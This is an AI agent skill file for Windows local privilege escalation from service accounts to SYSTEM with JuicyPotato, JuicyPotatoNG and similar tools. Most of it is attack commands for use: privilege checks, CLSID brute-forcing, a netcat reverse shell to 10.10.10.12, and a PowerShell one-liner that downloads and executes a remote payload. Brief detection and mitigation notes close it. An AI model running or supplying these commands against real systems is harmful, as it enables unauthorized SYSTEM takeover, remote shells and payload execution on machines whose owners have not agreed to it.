---
name: windows-juicypotato
description: Use JuicyPotato for Windows local privilege escalation from service accounts to SYSTEM. Use this skill whenever the user mentions privilege escalation, Windows service accounts, SYSTEM access, SeImpersonatePrivilege, SeAssignPrimaryTokenPrivilege, DCOM abuse, or needs to escalate from a lower-privileged Windows account. Also trigger for JuicyPotatoNG, RoguePotato, PrintSpoofer, or any Windows LPE technique discussion.
---

# JuicyPotato Local Privilege Escalation

A skill for performing local privilege escalation on Windows systems using JuicyPotato and related techniques.

## When to Use This Skill

Use this skill when:
- You have a Windows service account with `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege`
- You need to escalate from a service account to `NT AUTHORITY\SYSTEM`
- You're working on Windows 10 1803 or earlier / Windows Server 2016 or earlier
- You need to find working CLSIDs for DCOM abuse
- You're exploring modern alternatives like JuicyPotatoNG, RoguePotato, or PrintSpoofer

## Prerequisites

### Required Privileges

The current user must have one of:
- `SeImpersonatePrivilege` - Allows `CreateProcessWithTokenW`
- `SeAssignPrimaryTokenPrivilege` - Allows `CreateProcessAsUser`

### Check Your Privileges

```powershell
# Check for required privileges
whoami /priv | Select-String "SeImpersonatePrivilege|SeAssignPrimaryTokenPrivilege"

# Or use the helper script
./check-privileges.ps1
```

### Windows Version Compatibility

| Windows Version | JuicyPotato | JuicyPotatoNG | Alternatives |
|----------------|-------------|---------------|-------------|
| 10 1803 / Server 2016 | ✅ Works | ✅ Works | - |
| 10 1809 / Server 2019 | ❌ Patched | ⚠️ Situational | RoguePotato, PrintSpoofer |
| 10 20H2+ / Server 2022 | ❌ Patched | ⚠️ Limited | EfsPotato, GodPotato |
| Windows 11 | ❌ Patched | ⚠️ Limited | EfsPotato, GodPotato |

## Quick Start

### Basic JuicyPotato Usage

```bash
# Download JuicyPotato from:
# https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts

# Basic syntax
JuicyPotato.exe -t <mode> -p <program> -l <port> [options]

# Example: Get SYSTEM shell
JuicyPotato.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami" -l 1337
```

### Parameter Reference

| Flag | Description | Default |
|------|-------------|--------|
| `-t` | Token mode: `c`=CreateProcessWithToken, `u`=CreateProcessAsUser, `*`=try both | Required |
| `-p` | Program to launch | Required |
| `-l` | COM server listen port | Required |
| `-c` | CLSID to target | Auto-selected |
| `-a` | Arguments to pass to program | NULL |
| `-m` | COM server listen IP | 127.0.0.1 |
| `-k` | RPC server IP | 127.0.0.1 |
| `-n` | RPC server port | 135 |

## Finding Working CLSIDs

### Method 1: Use the CLSID List

Visit [https://ohpe.it/juicy-potato/CLSID/](https://ohpe.it/juicy-potato/CLSID/) for OS-specific CLSID lists.

### Method 2: Enumerate Locally

```powershell
# Download and run the enumeration scripts
# https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1
# https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1

# Then test with the helper script
./test-clsid.ps1 -juicypotato "path\to\JuicyPotato.exe"
```

### Method 3: Use the Helper Script

```bash
# Automatically test CLSIDs and find working ones
./find-working-clsid.sh -jp "JuicyPotato.exe" -p 1337
```

## Common Attack Scenarios

### Scenario 1: Reverse Shell

```bash
# Get a reverse shell via netcat
JuicyPotato.exe -t * -p "C:\Windows\System32\cmd.exe" \
  -a "/c nc.exe -e cmd.exe 10.10.10.12 443" \
  -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}"
```

### Scenario 2: PowerShell Download

```bash
# Download and execute a payload
JuicyPotato.exe -t * -p "C:\Windows\System32\cmd.exe" \
  -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.10.12:8080/payload.ps1')" \
  -l 1337
```

### Scenario 3: Interactive Shell (RDP Available)

```bash
# Launch interactive CMD for RDP access
JuicyPotato.exe -t * -p "C:\Windows\System32\cmd.exe" -l 1337
```

## JuicyPotatoNG (Modern Alternative)

For Windows 10 1809+ where classic JuicyPotato is patched:

```bash
# Basic usage
JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami"

# Scan for available COM ports
JuicyPotatoNG.exe -s

# Bruteforce CLSIDs (testing only)
JuicyPotatoNG.exe -b -t * -p "C:\Windows\System32\cmd.exe"

# Interactive console
JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -i
```

## Troubleshooting

### "CLSID doesn't work"

**Problem**: The default CLSID fails to escalate.

**Solution**: Try different CLSIDs from the list:

```bash
# Common working CLSIDs to try
- "{4991d34b-80a1-4291-83b6-3328366b9097}"  # Windows 10 1803
- "{6b3b8f25-589c-4995-b1e8-ea4534176341}"  # Windows 10 1803
- "{a47979d2-c419-11d0-8c16-00c04fd918b4}"  # Windows 10 1803
```

### "Port already in use"

**Problem**: The COM port is already bound.

**Solution**: Use a different port:

```bash
JuicyPotato.exe -t * -p "C:\Windows\System32\cmd.exe" -l 1338
```

### "Access denied" or "Privilege not found"

**Problem**: Current user lacks required privileges.

**Solution**: Check privileges first:

```powershell
whoami /priv | Select-String "SeImpersonatePrivilege|SeAssignPrimaryTokenPrivilege"
```

If missing, you need a different escalation path.

### "DCOM not available"

**Problem**: DCOM is disabled or misconfigured.

**Solution**: Check DCOM status:

```powershell
# Check if DCOM is enabled
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Ole\AutoActivation" -ErrorAction SilentlyContinue
```

## Modern Alternatives

When JuicyPotato doesn't work (Windows 10 1809+), try:

| Tool | Best For | Notes |
|------|----------|-------|
| **RoguePotato** | Windows 10 1809+ | Uses Print Spooler |
| **PrintSpoofer** | Windows 10 1809+ | Print Spooler abuse |
| **EfsPotato/GodPotato** | Windows 11 / Server 2022 | EFS service abuse |
| **SharpEfsPotato** | Windows 11 / Server 2022 | .NET version |

## Security Notes

### Detection

- Monitor for unusual DCOM activity
- Watch for new processes spawned from service accounts
- Check for `CreateProcessWithTokenW` and `CreateProcessAsUser` API calls
- Monitor port 135 (RPC) and custom COM ports

### Mitigation

- Remove `SeImpersonatePrivilege` and `SeAssignPrimaryTokenPrivilege` from service accounts
- Use least privilege for service accounts
- Consider disabling DCOM if not needed (may impact system functionality)
- Keep Windows updated (though newer techniques emerge)

## References

- [JuicyPotato GitHub](https://github.com/ohpe/juicy-potato)
- [JuicyPotato CLSID List](https://ohpe.it/juicy-potato/CLSID/)
- [JuicyPotatoNG Blog Post](https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/)
- [Rotten Potato Original](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)
